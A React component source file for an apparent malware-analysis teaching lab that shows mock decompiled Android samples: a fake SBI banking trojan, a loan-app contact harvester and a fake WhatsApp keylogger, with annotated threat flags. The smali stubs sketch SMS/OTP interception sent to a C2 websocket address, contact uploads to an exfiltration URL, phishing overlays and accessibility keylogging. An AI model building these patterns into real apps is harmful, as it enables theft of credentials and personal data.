import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  FileCode, ShieldAlert, Binary, Check, Info, Folder, Eye, ShieldCheck, 
  Cpu, Radio, Laptop, RefreshCw, Zap, Server, Activity, ChevronRight, AlertTriangle
} from 'lucide-react';
import { CyberSpotlightScanner } from './CyberSpotlightScanner';

interface DecompiledFile {
  name: string;
  type: 'xml' | 'smali';
  path: string;
  content: string;
  signals: Array<{ line: number; type: 'critical' | 'warning' | 'info'; text: string }>;
}

interface ApkSample {
  name: string;
  packageName: string;
  size: string;
  riskScore: number;
  family: string;
  files: DecompiledFile[];
}

const APK_SAMPLES: ApkSample[] = [
  {
    name: 'SBI_Security_Rewards.apk',
    packageName: 'com.sbi.secure.verify',
    size: '4.8 MB',
    riskScore: 92,
    family: 'Anubis_X Banking Trojan',
    files: [
      {
        name: 'AndroidManifest.xml',
        type: 'xml',
        path: 'AndroidManifest.xml',
        content: `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.sbi.secure.verify">
    
    <!-- Intent interceptors for multi-factor authentication codes -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application 
        android:label="SBI Rewards Update"
        android:theme="@style/Theme.SBI">
        
        <receiver android:name=".service.SmsReader" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        
        <service android:name=".service.OverlayScreen" android:exported="false" />
    </application>
</manifest>`,
        signals: [
          { line: 5, type: 'critical', text: 'Critical permission requested to silently monitor incoming SMS notifications.' },
          { line: 7, type: 'critical', text: 'Allows the application to draw invasive phishing overlay windows over banking applications.' },
          { line: 14, type: 'warning', text: 'Establishes a high-priority system-wide broadcast receiver for cellular SMS intents.' }
        ]
      },
      {
        name: 'SmsReader.smali',
        type: 'smali',
        path: 'smali/com/sbi/secure/service/SmsReader.smali',
        content: `.class public Lcom/sbi/secure/service/SmsReader;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 8
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
    move-result-object p1
    const-string v0, "pdus"
    invoke-virtual {p1, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)[Ljava/lang/Object;
    move-result-object p1
    
    # Extract string matching transaction metrics and cellular OTP formats
    # Direct relay established via websocket tunnel to C2 server
    const-string v1, "wss://103.242.12.5/receiver"
    invoke-static {p1, v1}, Lcom/sbi/secure/utils/Exfiltrator;->send(Ljava/lang/Object;Ljava/lang/String;)V
    return-void
.end method`,
        signals: [
          { line: 11, type: 'critical', text: 'Identified target remote Command & Control (C2) websocket IP tunnel.' },
          { line: 12, type: 'critical', text: 'Exfiltrates raw payload data over web socket protocols.' }
        ]
      },
      {
        name: 'OverlayScreen.smali',
        type: 'smali',
        path: 'smali/com/sbi/secure/service/OverlayScreen.smali',
        content: `.class public Lcom/sbi/secure/service/OverlayScreen;
.super Landroid/app/Service;

# Injects high-priority mock login components to capture security parameters
.method public drawOverlay()V
    .registers 4
    new-instance v0, Landroid/view/WindowManager$LayoutParams;
    const/16 v1, 2038  # TYPE_APPLICATION_OVERLAY window type
    const/16 v2, 1024  # FLAG_NOT_FOCUSABLE window state flags
    invoke-direct {v0, v1, v2}, Landroid/view/WindowManager$LayoutParams;-><init>(II)V
    
    const-string v3, "file:///android_asset/sbi_phish.html"
    invoke-static {v3}, Lcom/sbi/secure/service/OverlayScreen;->renderWeb(Ljava/lang/String;)V
    return-void
.end method`,
        signals: [
          { line: 6, type: 'warning', text: 'System-level overlay type utilized to render full-screen elements over other apps.' },
          { line: 9, type: 'critical', text: 'Discovered suspicious phishing web asset path embedded in smali class.' }
        ]
      }
    ]
  },
  {
    name: 'FastLoan_Instant_In.apk',
    packageName: 'com.fastloan.instant.in',
    size: '6.2 MB',
    riskScore: 85,
    family: 'SpyAgent Contact Harvester',
    files: [
      {
        name: 'AndroidManifest.xml',
        type: 'xml',
        path: 'AndroidManifest.xml',
        content: `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.fastloan.instant.in">
    
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application 
        android:label="FastLoan Instant India"
        android:allowBackup="false">
        
        <service android:name=".ContactHarvester" android:exported="false" />
    </application>
</manifest>`,
        signals: [
          { line: 4, type: 'critical', text: 'Accesses the complete user contacts list without context.' },
          { line: 5, type: 'warning', text: 'Queries cellular phone identifiers, carrier network states, and active IMEI flags.' }
        ]
      },
      {
        name: 'ContactHarvester.smali',
        type: 'smali',
        path: 'smali/com/fastloan/instant/in/ContactHarvester.smali',
        content: `.class public Lcom/fastloan/instant/in/ContactHarvester;
.super Landroid/app/IntentService;

.method protected onHandleIntent(Landroid/content/Intent;)V
    .registers 4
    # Gathers dynamic database structures of user contact logs
    invoke-static {}, Lcom/fastloan/instant/in/ContactHarvester;->retrieveAllContacts()Ljava/util/List;
    move-result-object v0
    
    # Exfiltrates the full roster payload to extortion/C2 web server
    const-string v1, "https://fastloan-c2.in/api/v1/contacts"
    invoke-static {v0, v1}, Lcom/fastloan/instant/in/Uploader;->uploadContacts(Ljava/util/List;Ljava/lang/String;)V
    return-void
.end method`,
        signals: [
          { line: 6, type: 'critical', text: 'Queries system SQLite contact tables directly in background threads.' },
          { line: 10, type: 'critical', text: 'Uploads stolen user address books to a known malicious exfiltration URL.' }
        ]
      }
    ]
  },
  {
    name: 'WhatsApp_Beta_Secure.apk',
    packageName: 'com.whatsapp.beta.secure',
    size: '12.4 MB',
    riskScore: 94,
    family: 'SpyNote Premium Keylogger',
    files: [
      {
        name: 'AndroidManifest.xml',
        type: 'xml',
        path: 'AndroidManifest.xml',
        content: `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.whatsapp.beta.secure">
    
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.INTERNET" />

    <application android:label="Secure WhatsApp Beta">
        <service android:name=".AccessibilityTracker" 
                 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                 android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
        </service>
    </application>
</manifest>`,
        signals: [
          { line: 4, type: 'critical', text: 'Abuses accessibility permissions to keylog and bypass operating system security bounds.' }
        ]
      },
      {
        name: 'AccessibilityTracker.smali',
        type: 'smali',
        path: 'smali/com/whatsapp/beta/secure/AccessibilityTracker.smali',
        content: `.class public Lcom/whatsapp/beta/secure/AccessibilityTracker;
.super Landroid/accessibilityservice/AccessibilityService;

# Sniffs keystrokes from text fields, targeting global activity widgets
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v0
    
    # Intercept text input fields inside active view models
    invoke-static {v0}, Lcom/whatsapp/beta/secure/Keylogger;->sniffFields(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    return-void
.end method`,
        signals: [
          { line: 5, type: 'critical', text: 'Traverses screen UI node trees asynchronously to capture security pins.' },
          { line: 8, type: 'critical', text: 'Sniffs raw keys typed in active input views globally across clean banking states.' }
        ]
      }
    ]
  }
];

export const ApkLab: React.FC = () => {
  const [selectedApk, setSelectedApk] = useState<ApkSample>(APK_SAMPLES[0]);
  const [selectedFile, setSelectedFile] = useState<DecompiledFile>(APK_SAMPLES[0].files[0]);
  const [scanMode, setScanMode] = useState<'DECOMPILE' | 'SPECTRE_LENS'>('DECOMPILE');
  const [beamLine, setBeamLine] = useState<number>(0);
  const [bytecodeScattered, setBytecodeScattered] = useState<string[]>([]);

  // Generate random bytes for the spectral matrix on file load
  useEffect(() => {
    const bytes: string[] = [];
    for (let i = 0; i < 40; i++) {
      bytes.push(Math.floor(Math.random() * 256).toString(16).toUpperCase().padStart(2, '0'));
    }
    setBytecodeScattered(bytes);
  }, [selectedFile]);

  // Handle active file changing
  const handleApkChange = (apk: ApkSample) => {
    setSelectedApk(apk);
    setSelectedFile(apk.files[0]);
  };

  const getSignalBadgeStyle = (type: 'critical' | 'warning' | 'info') => {
    switch (type) {
      case 'critical':
        return 'bg-red-500/10 text-red-400 border-red-500/20';
      case 'warning':
        return 'bg-amber-500/10 text-amber-400 border-amber-500/20';
      default:
        return 'bg-blue-500/10 text-blue-400 border-blue-500/20';
    }
  };

  return (
    <div className="w-full h-full flex flex-col bg-neutral-950 rounded-2xl border border-white/5 overflow-hidden text-left font-sans shadow-2xl">
      
      {/* Tab bar header to switch between active targets */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center px-5 py-4 bg-neutral-900 border-b border-white/5 shrink-0 gap-3">
        <div className="flex items-center gap-2">
          <Binary className="text-amber-400 animate-pulse" size={18} />
          <span className="text-xs font-black font-mono text-white tracking-widest uppercase">Target Sandbox:</span>
        </div>
        
        {/* Crisp switches */}
        <div className="flex flex-wrap gap-1.5">
          {APK_SAMPLES.map((apk) => (
            <button
              key={apk.name}
              onClick={() => handleApkChange(apk)}
              className={`px-3 py-1.5 rounded-lg text-[10px] font-mono font-bold tracking-tight transition-all duration-300 cursor-pointer border ${
                selectedApk.name === apk.name
                  ? 'bg-amber-400 text-black border-amber-400 shadow-md shadow-amber-400/10'
                  : 'bg-white/[0.03] text-white/50 hover:text-white hover:bg-white/5 border-white/5'
              }`}
            >
              {apk.name}
            </button>
          ))}
        </div>
      </div>

      {/* Target details summary row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 px-6 py-4 bg-neutral-900/60 border-b border-white/5 shrink-0">
        <div>
          <span className="text-[10px] uppercase tracking-wider font-mono text-white/40 block font-bold">Package ID</span>
          <span className="text-xs font-mono font-black text-white/90 mt-1 block truncate">{selectedApk.packageName}</span>
        </div>
        <div>
          <span className="text-[10px] uppercase tracking-wider font-mono text-white/40 block font-bold">Trojan Family</span>
          <span className="text-xs font-mono font-black text-amber-400 mt-1 block truncate font-semibold">{selectedApk.family}</span>
        </div>
        <div>
          <span className="text-[10px] uppercase tracking-wider font-mono text-white/40 block font-bold">Threat Severity</span>
          <span className="text-xs font-mono font-black text-red-400 mt-1 block tracking-wider">
            {selectedApk.riskScore}/100 SEC_CRITICAL
          </span>
        </div>
         <div>
          <span className="text-[10px] uppercase tracking-wider font-mono text-white/40 block font-bold">Compressed size</span>
          <span className="text-xs font-mono font-black text-white/85 mt-1 block">{selectedApk.size}</span>
        </div>
      </div>

      {/* Sub-mode selection subheader bar */}
      <div className="flex border-b border-white/5 bg-neutral-900/40 p-2 gap-2 justify-start items-center shrink-0">
        <button
          onClick={() => setScanMode('DECOMPILE')}
          className={`px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all duration-300 cursor-pointer flex items-center gap-2 border ${
            scanMode === 'DECOMPILE' 
              ? 'bg-amber-400 text-black border-amber-400 font-bold shadow-[0_0_15px_rgba(255,176,0,0.15)]' 
              : 'text-white/45 hover:text-white hover:bg-white/5 border-transparent'
          }`}
        >
          <Laptop size={11} /> Deep Spectral Bytecode Blueprint
        </button>
        <button
          onClick={() => setScanMode('SPECTRE_LENS')}
          className={`px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all duration-300 cursor-pointer flex items-center gap-2 border ${
            scanMode === 'SPECTRE_LENS' 
              ? 'bg-red-500 text-white border-red-500 font-bold shadow-[0_0_15px_rgba(255,31,31,0.25)]' 
              : 'text-white/45 hover:text-white hover:bg-white/5 border-transparent'
          }`}
        >
          <Radio size={11} className="animate-spin-slow" /> Immersive Spotlight Scan
        </button>
      </div>

      <div className="flex-1 min-h-0 overflow-hidden relative">
        <AnimatePresence mode="wait">
          {scanMode === 'SPECTRE_LENS' ? (
            <motion.div
              key="spectre-module"
              initial={{ opacity: 0, scale: 0.99 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.01 }}
              transition={{ duration: 0.25 }}
              className="w-full h-full"
            >
              <CyberSpotlightScanner />
            </motion.div>
          ) : (
            <motion.div
              key="decompile-module"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.25 }}
              className="w-full h-full flex flex-col lg:flex-row min-h-0 overflow-hidden"
            >
              {/* Left pane: File hierarchy structure tree */}
              <div className="w-full lg:w-60 bg-neutral-950 border-r border-white/5 flex flex-col shrink-0 min-h-0">
                <div className="p-3 border-b border-white/5 text-[9px] uppercase tracking-widest font-mono text-white/45 font-black flex justify-between items-center bg-black/30">
                  <span>MANIFEST & SOURCE</span>
                  <Activity size={10} className="text-amber-400 animate-pulse" />
                </div>
                
                <div className="flex-1 p-2.5 space-y-1.5 overflow-y-auto custom-scrollbar">
                  {selectedApk.files.map((file) => (
                    <button
                      key={file.path}
                      onClick={() => setSelectedFile(file)}
                      className={`w-full text-left p-2.5 rounded-xl text-xs font-mono flex items-center gap-2 transition-all cursor-pointer border ${
                        selectedFile.path === file.path
                          ? 'bg-white/5 text-white border-white/15 shadow-[0_0_10px_rgba(255,255,255,0.02)]'
                          : 'text-white/50 hover:text-white hover:bg-white/[0.02] border-transparent'
                      }`}
                    >
                      {file.type === 'xml' ? (
                        <FileCode size={14} className="text-amber-400 shrink-0" />
                      ) : (
                        <Binary size={14} className="text-cyan-400 shrink-0" />
                      )}
                      <span className="truncate font-mono">{file.name}</span>
                      {file.signals.length > 0 && (
                        <span className="ml-auto flex h-2 w-2 rounded-full bg-red-400 animate-pulse" />
                      )}
                    </button>
                  ))}
                </div>

                {/* Micro byte-DNA signature panel for gaudy feedback on current file */}
                <div className="p-3.5 border-t border-white/5 bg-black/40 space-y-2">
                  <span className="text-[8px] uppercase tracking-widest font-mono text-white/30 block font-bold">Spectral Entropy DNA</span>
                  <div className="flex gap-1">
                    {bytecodeScattered.slice(0, 15).map((b, i) => (
                      <div 
                        key={i} 
                        className={`flex-1 h-3 rounded-sm text-[6.5px] font-mono text-center flex items-center justify-center leading-none ${
                          parseInt(b, 16) > 165
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                            : parseInt(b, 16) > 90
                              ? 'bg-amber-400/20 text-amber-400 border border-amber-400/30'
                              : 'bg-emerald-500/10 text-emerald-400/60 border border-emerald-500/20'
                        }`}
                        title={`Byte vector: ${b}`}
                      >
                        {b[0]}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Center: Main Editor & Syntax view */}
              <div className="flex-1 flex flex-col min-h-0 bg-[#07070b] overflow-hidden relative">
                
                {/* Horizontal moving x-ray decompile laser scan line */}
                <motion.div 
                  className="absolute left-0 right-0 h-[1.5px] bg-cyan-400/40 shadow-[0_0_12px_#00f0ff] pointer-events-none z-30"
                  animate={{ top: ['0%', '100%'] }}
                  transition={{ repeat: Infinity, duration: 4.8, ease: 'linear' }}
                />

                {/* Editor Header information badge wrapper */}
                <div className="px-5 py-3 border-b border-white/5 flex items-center justify-between bg-black/40 shrink-0 select-none">
                  <span className="text-[10px] font-mono text-white/55 flex items-center gap-1.5">
                    <Folder size={12} className="text-cyan-400 opacity-85" /> {selectedFile.path}
                  </span>
                  
                  {/* Holographic Byte blueprint rate */}
                  <span className="text-[8.5px] font-mono uppercase tracking-[0.16em] text-red-400 bg-red-400/10 px-2.5 py-1 rounded-md border border-red-400/25 flex items-center gap-1.5 animate-pulse">
                    <Zap size={10} className="text-red-400" /> PayLoad X-Ray Decrypted
                  </span>
                </div>

                {/* Spectral Hotspot Scanner Bar: Visual indicator of threat line density */}
                <div className="h-5 px-5 bg-neutral-950/90 border-b border-white/5 flex gap-1 items-center justify-start select-none">
                  <span className="text-[7.5px] font-mono text-white/30 uppercase tracking-widest mr-2">Threat Sectors:</span>
                  {selectedFile.content.split('\n').map((_, idx) => {
                    const signalOnLine = selectedFile.signals.find(sig => sig.line === idx + 1);
                    return (
                      <div 
                        key={idx} 
                        className={`flex-1 h-2 rounded-sm transition-all ${
                          signalOnLine 
                            ? (signalOnLine.type === 'critical' ? 'bg-red-500 shadow-[0_0_8px_#ef4444] animate-pulse' : 'bg-amber-400 shadow-[0_0_6px_#f59e0b]') 
                            : 'bg-white/[0.04]'
                        }`}
                        title={signalOnLine ? `Offset Flag line ${idx + 1}: ${signalOnLine.text}` : `Sector Line ${idx + 1}`}
                      />
                    );
                  })}
                </div>

                {/* Interactive Source view stage */}
                <div className="flex-1 overflow-y-auto p-5 font-mono text-[11.5px] leading-relaxed relative custom-scrollbar flex min-w-0 bg-neutral-950/20">
                  {/* Line numbers column */}
                  <div className="text-right select-none text-white/15 pr-5 border-r border-white/5 shrink-0 hidden sm:block font-mono font-bold">
                    {selectedFile.content.split('\n').map((_, i) => (
                      <div key={i} className="h-5">{i + 1}</div>
                    ))}
                  </div>

                  {/* Scrollable code text */}
                  <div className="pl-5 overflow-x-auto flex-1 min-w-0 font-mono">
                    {selectedFile.content.split('\n').map((line, i) => {
                      const signalOnLine = selectedFile.signals.find(sig => sig.line === i + 1);
                      
                      return (
                        <div 
                          key={i} 
                          className={`h-5 flex items-center relative group transition-colors ${
                            signalOnLine 
                              ? (signalOnLine.type === 'critical' ? 'bg-red-500/10 text-red-200' : 'bg-amber-400/10 text-amber-100')
                              : 'text-neutral-300 hover:bg-white/[0.01]'
                          }`}
                        >
                          <span className="whitespace-pre font-mono">{line}</span>
                          
                          {/* Inline critical warning trigger overlays */}
                          {signalOnLine && (
                            <>
                              <span className={`absolute left-0 right-0 top-0 bottom-0 border-l-2 pointer-events-none ${
                                signalOnLine.type === 'critical' ? 'border-red-500' : 'border-amber-400'
                              }`} />
                              <div className={`absolute right-3 opacity-0 group-hover:opacity-100 transition-opacity bg-neutral-900 border text-[8px] font-mono font-black uppercase px-2 py-0.5 rounded-md pointer-events-none z-10 flex items-center gap-1 shadow-2xl ${
                                signalOnLine.type === 'critical' ? 'text-red-400 border-red-500/30' : 'text-amber-400 border-amber-400/30'
                              }`}>
                                <AlertTriangle size={8} /> Line {signalOnLine.line}: {signalOnLine.type.toUpperCase()}_SIGN
                              </div>
                            </>
                          )}
                        </div>
                      );
                    })}
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

    </div>
  );
};
